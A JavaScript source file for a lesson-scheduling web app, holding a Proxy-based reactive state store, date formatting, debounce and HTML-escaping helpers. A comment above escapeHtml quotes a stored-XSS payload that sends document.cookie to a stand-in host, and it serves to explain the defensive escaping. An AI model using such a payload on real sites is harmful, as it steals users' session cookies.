// =============================================================================
// REACTIVE STATE STORE (iteration 5)
// =============================================================================
// `state` is the central app store. It looks and behaves like a plain object —
// all existing reads (`state.lessons`, `state.user`, …) and writes
// (`state.lessons = newArray`) keep working unchanged. UNDER THE HOOD it's a
// Proxy that, on every property assignment, notifies anyone who subscribed to
// that key via `subscribe(key, fn)`.
//
// Why a Proxy and not setState/getState?
//   - 235 existing call-sites read `state.lessons` directly. Switching to
//     `getState('lessons')` would mean touching all of them. The Proxy lets
//     us keep the simple read syntax and add reactivity transparently.
//
// What the Proxy CANNOT catch:
//   - In-place mutation: `state.lessons.push(...)` and
//     `state.lessons.forEach(l => l.foo = 'x')` don't go through the setter,
//     so subscribers won't fire. After any in-place change, call
//     `publish('lessons')` to notify manually. Reassignment with the spread
//     operator (`state.lessons = [...state.lessons, x]`) is the cleaner
//     pattern when possible.
//
// Usage examples:
//   subscribe('placingLesson', (newVal) => {
//     if (newVal) showPlacingBanner(); else hidePlacingBanner();
//   });
//   state.placingLesson = { … }; // → banner appears automatically
//   state.placingLesson = null;  // → banner hides automatically
// =============================================================================

const _stateData = {
  user: null,
  profile: null,
  currentWeekStart: null,
  lessons: [],
  students: [],
  selectedRole: null,
  lessonModal: null,
  placingLesson: null,
  placingStudent: null,
  placingTruant: null
};

// key (string) → Set<function>
const _subscribers = new Map();

function _notify(key, newValue, oldValue) {
  const subs = _subscribers.get(key);
  if (!subs || subs.size === 0) return;
  // Snapshot to allow subscribers to unsubscribe during the iteration without
  // breaking the loop. Errors in one subscriber must not stop the others.
  Array.from(subs).forEach(fn => {
    try { fn(newValue, oldValue); }
    catch (e) { console.error('[state] subscriber error for key=' + key + ':', e); }
  });
}

const state = new Proxy(_stateData, {
  set(target, key, value) {
    const old = target[key];
    target[key] = value;
    if (old !== value) _notify(key, value, old);
    return true;
  }
});

// Subscribe to changes of a single state key. Returns an unsubscribe function.
// Subscribers are invoked synchronously AFTER the assignment, with
// (newValue, oldValue). Use `publish(key)` to manually trigger when the value
// was mutated in place (e.g. array push, object property change).
function subscribe(key, fn) {
  if (typeof fn !== 'function') throw new Error('subscribe: fn must be a function');
  if (!_subscribers.has(key)) _subscribers.set(key, new Set());
  _subscribers.get(key).add(fn);
  return function unsubscribe() {
    const set = _subscribers.get(key);
    if (set) set.delete(fn);
  };
}

// Force-fire all subscribers for a key with the current value. Use after
// in-place mutation (e.g. `state.lessons.push(x); publish('lessons');`).
function publish(key) {
  if (key in _stateData) _notify(key, _stateData[key], _stateData[key]);
}

function getMonday(date) {
  const d = new Date(date);
  const day = d.getDay();
  const diff = d.getDate() - day + (day === 0 ? -6 : 1);
  d.setDate(diff);
  d.setHours(0, 0, 0, 0);
  return d;
}

// Format as YYYY-MM-DD from LOCAL date parts. Not toISOString(): that converts to
// UTC first, so a local midnight Monday in UTC+3 serialises as the previous Sunday,
// while the same week in a negative offset serialises as Monday — two users in
// different zones would compute different week_start keys for the same week.
function formatDate(date) {
  const d = new Date(date);
  const mm = String(d.getMonth() + 1).padStart(2, '0');
  const dd = String(d.getDate()).padStart(2, '0');
  return `${d.getFullYear()}-${mm}-${dd}`;
}

function formatDateShort(date) {
  return date.toLocaleDateString('ru-RU', { day: 'numeric', month: 'short' });
}

// Small debounce helper. Returns a wrapped fn that delays calling `fn(...args)` until
// `ms` milliseconds have passed without further invocations. Used to throttle search-box
// inputs so we don't re-render the student list on every keystroke for 200+ students.
function debounce(fn, ms) {
  let t = null;
  return function (...args) {
    if (t) clearTimeout(t);
    t = setTimeout(() => { t = null; fn.apply(this, args); }, ms);
  };
}

// HTML-escape any value before interpolating into an `.innerHTML = ...` template string.
// Prevents stored-XSS: a malicious student.first_name like
//   `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`
// would otherwise execute when an admin/teacher opens a list containing it.
// Returns '' for null/undefined so we don't render the literal string «undefined».
function escapeHtml(s) {
  if (s === null || s === undefined) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
